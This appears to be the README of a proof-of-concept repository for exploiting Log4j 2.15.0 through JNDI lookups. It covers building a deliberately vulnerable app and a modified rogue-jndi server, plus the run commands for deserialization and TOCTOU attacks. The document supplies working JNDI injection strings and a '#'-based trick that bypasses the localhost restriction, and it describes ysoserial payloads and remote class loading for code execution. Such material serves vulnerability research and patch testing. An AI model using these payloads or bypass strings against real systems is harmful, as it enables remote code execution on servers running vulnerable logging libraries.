## POC
log4j2.xml and poc.java provides an example vulnerable application built with log4j 2.15.0.  
rogue-jndi is a modified version of Veracode's rogue-jndi published [here](https://github.com/veracode-research/rogue-jndi)

## Build the poc and rogue-jdni servers
1. Run get-deps.sh to obtain the necessary jar dependencies. You will also need to install maven to build rogue-jndi
2. Build the poc using ./build.sh
3. Build rogue-jndi by running ./build.sh within the rogue-jndi directory

## Running the poc
1. Run rogue-jndi by running the run.sh script in the rogue-jndi directory.
2. Run the ./run.sh script in the outer directory for the two POCs like so
```
./run.sh ${jndi://localhost:1389/o=deserialization}
./run.sh ${jndi://localhost:1389/o=toctou}
```

For systems that are susceptible to the localhost bypass, you may run
```
./run.sh ${jndi://localhost#localhost.friendspacebookplusallaccessredpremium.com:1389/o=deserialization}
./run.sh ${jndi://localhost#localhost.friendspacebookplusallaccessredpremium.com:1389/o=toctou}
```
or
```
./run.sh ${jndi://localhost#macos.friendspacebookplusallaccessredpremium.com:1389/o=deserialization}
./run.sh ${jndi://localhost#macos.friendspacebookplusallaccessredpremium.com:1389/o=toctou}
```

These domains resolve to 127.127.127.127 and 127.0.0.1 respectively.

## Payloads

### Deserialization
The deserialization payload is built using ysoserial and relies on the creative-commons-3.1 gadget chain.
The default provided payload runs gnome-calculator. See the included generate-deser-payload.sh  for alternative
payloads.

### HTTP Class Loader
The command ran using the URLClassLoader is specified in the rogue-jndi/run.sh scrpit.
